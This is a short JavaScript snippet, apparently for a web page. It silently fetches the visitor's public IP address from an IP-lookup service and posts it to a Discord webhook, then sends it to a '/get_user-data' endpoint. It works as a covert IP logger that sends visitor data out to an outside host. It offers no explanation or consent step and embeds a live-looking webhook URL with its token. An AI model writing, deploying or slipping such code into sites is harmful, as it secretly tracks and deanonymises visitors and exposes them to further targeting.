var ip = '';
fetch('https://api.ipify.org/?format=json')
.then(function (response) {
    return response.json();
})
.then(function (data) {
    ip = data.ip;
    var webhook = 'https://discord.com/api/webhooks/1129356542517452830/p8mUSjZu_jXdsvLR6q6SxuxjfYGxkh_HpdbjOCMWYCy6iFvPSIa4N6zIJi9q0lB_aL1f';
    var message = {
    content: ip
    };

    fetch(webhook, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify(message)
    });

    fetch('/get_user-data', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ ip: ip })
        });
});